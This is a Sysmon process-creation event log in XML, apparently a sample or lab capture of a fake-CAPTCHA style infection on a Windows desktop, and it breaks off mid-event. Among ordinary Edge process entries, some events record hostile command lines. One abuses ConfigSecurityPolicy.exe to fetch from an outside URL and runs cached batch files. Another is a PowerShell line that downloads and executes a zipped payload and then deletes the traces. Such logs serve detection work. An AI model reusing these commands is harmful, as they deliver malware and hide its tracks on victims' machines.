<Events>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:00.123456789Z" />
      <EventRecordID>1</EventRecordID>
      <Correlation />
      <Execution ProcessID="0" ThreadID="0" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:00.123</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000000}</Data>
      <Data Name="ProcessId">0</Data>
      <Data Name="Image">Unknown</Data>
      <Data Name="FileVersion">Unknown</Data>
      <Data Name="CommandLine">[System Process]</Data>
      <Data Name="CurrentDirectory">Unknown</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000001}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">0</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA256=0000000000000000000000000000000000000000000000000000000000000000</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000000}</Data>
      <Data Name="ParentProcessId">0</Data>
      <Data Name="ParentImage">Unknown</Data>
      <Data Name="ParentCommandLine">Unknown</Data>
      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:00.188900000Z" />
      <EventRecordID>2</EventRecordID>
      <Correlation />
      <Execution ProcessID="188" ThreadID="300" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:00.188</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000002}</Data>
      <Data Name="ProcessId">188</Data>
      <Data Name="Image">C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe</Data>
      <Data Name="FileVersion">10.0.19041.1</Data>
      <Data Name="CommandLine">"C:\Progra~1\Window~1\ConfigSecurityPolicy.exe" https://travel.ol/DY67H/m</Data>
      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000003}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA256=1e98d1a123f2f847d06e23b8f5664c741e98d1a123f2f847d06e23b8f5664c74</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000004}</Data>
      <Data Name="ParentProcessId">700</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c ...</Data>
      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:00.232900000Z" />
      <EventRecordID>3</EventRecordID>
      <Correlation />
      <Execution ProcessID="1232" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:00.232</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000005}</Data>
      <Data Name="ProcessId">1232</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=5908,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=3728 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:00.632900000Z" />
      <EventRecordID>4</EventRecordID>
      <Correlation />
      <Execution ProcessID="1632" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:00.632</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000008}</Data>
      <Data Name="ProcessId">1632</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=6784,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=6624 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:01.432900000Z" />
      <EventRecordID>5</EventRecordID>
      <Correlation />
      <Execution ProcessID="2432" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:01.432</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000009}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\WINDOWS\system32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.19041.3636</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe" /c "DeviceCredentialDeployment.exe &amp; "C:\Progra~1\Window~1\ConfigSecurityPolicy.exe" https://travel.ol/DY67H/m &amp; for /r "C:\Users\john\AppData\Local\Microsoft\Windows\INetCache\IE" %f in (*.bat) do call "%f""============VerificationCaptcha============</Data>
      <Data Name="CurrentDirectory">C:\Users\john\</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000a}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000b}</Data>
      <Data Name="ParentProcessId">884</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:02.552900000Z" />
      <EventRecordID>6</EventRecordID>
      <Correlation />
      <Execution ProcessID="2552" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:02.552</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000c}</Data>
      <Data Name="ProcessId">2552</Data>
      <Data Name="Image">C:\WINDOWS\system32\conhost.exe</Data>
      <Data Name="FileVersion">10.0.19041.3636</Data>
      <Data Name="CommandLine">\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="CurrentDirectory">C:\Users\john\</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000d}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=b3a3c9b7e909d949c25f463e263d8d64b3a3c9b7e909d949c25f463e263d8d64</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000009}</Data>
      <Data Name="ParentProcessId">2432</Data>
      <Data Name="ParentImage">C:\WINDOWS\system32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe" /c ...</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:03.664900000Z" />
      <EventRecordID>7</EventRecordID>
      <Correlation />
      <Execution ProcessID="2664" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:03.664</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000e}</Data>
      <Data Name="ProcessId">2664</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=5776,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=5728 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:03.976900000Z" />
      <EventRecordID>8</EventRecordID>
      <Correlation />
      <Execution ProcessID="2976" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:03.976</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000f}</Data>
      <Data Name="ProcessId">2976</Data>
      <Data Name="Image">C:\Windows\System32\DeviceCredentialDeployment.exe</Data>
      <Data Name="FileVersion">10.0.19041.3636</Data>
      <Data Name="CommandLine">DeviceCredentialDeployment.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\john\</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000010}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=c4b5d2e3f4a5c4b5d2e3f4a5c4b5d2e3f4a5c4b5d2e3f4a5c4b5d2e3f4a5c4b5</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000009}</Data>
      <Data Name="ParentProcessId">2432</Data>
      <Data Name="ParentImage">C:\WINDOWS\system32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe" /c ...</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:04.688900000Z" />
      <EventRecordID>9</EventRecordID>
      <Correlation />
      <Execution ProcessID="3688" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:04.688</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000011}</Data>
      <Data Name="ProcessId">3688</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --disable-quic --message-loop-type-ui --string-annotations --always-read-main-dll --field-trial-handle=7040,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=1456 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:04.944900000Z" />
      <EventRecordID>10</EventRecordID>
      <Correlation />
      <Execution ProcessID="3944" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:04.944</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000012}</Data>
      <Data Name="ProcessId">3944</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.19041.3636</Data>
      <Data Name="CommandLine">Powershell "$path = 'C:\ProgramData\x.zip';$Uri = 'https://travel.ol/x';invoke-RestMethod -Uri $Uri -OutFile $path;$UnZip = 'C:\ProgramData';Expand-Archive -Path $path -DestinationPath $UnZip -Force;C:\ProgramData\x\ApplicationFrameHost.exe;Start-Sleep -Seconds 10;Remove-Item $path,'C:\ProgramData\x','C:\ProgramData\m.bat' -Recurse -Force"</Data>
      <Data Name="CurrentDirectory">C:\Users\john\</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000013}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=d3f2c9a1b2c3d4e5d3f2c9a1b2c3d4e5d3f2c9a1b2c3d4e5d3f2c9a1b2c3d4e5</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000009}</Data>
      <Data Name="ParentProcessId">2432</Data>
      <Data Name="ParentImage">C:\WINDOWS\system32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe" /c ...</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:05.860900000Z" />
      <EventRecordID>11</EventRecordID>
      <Correlation />
      <Execution ProcessID="4860" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:05.860</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000014}</Data>
      <Data Name="ProcessId">4860</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=6748,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=4116 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:06.352900000Z" />
      <EventRecordID>12</EventRecordID>
      <Correlation />
      <Execution ProcessID="5352" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:06.352</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000015}</Data>
      <Data Name="ProcessId">5352</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --disable-quic --message-loop-type-ui --string-annotations --always-read-main-dll --field-trial-handle=7076,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=1520 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:06.620900000Z" />
      <EventRecordID>13</EventRecordID>
      <Correlation />
      <Execution ProcessID="5620" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:06.620</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000016}</Data>
      <Data Name="ProcessId">5620</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=2272,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=2536 /prefetch:3</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:06.764900000Z" />
      <EventRecordID>14</EventRecordID>
      <Correlation />
      <Execution ProcessID="5764" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
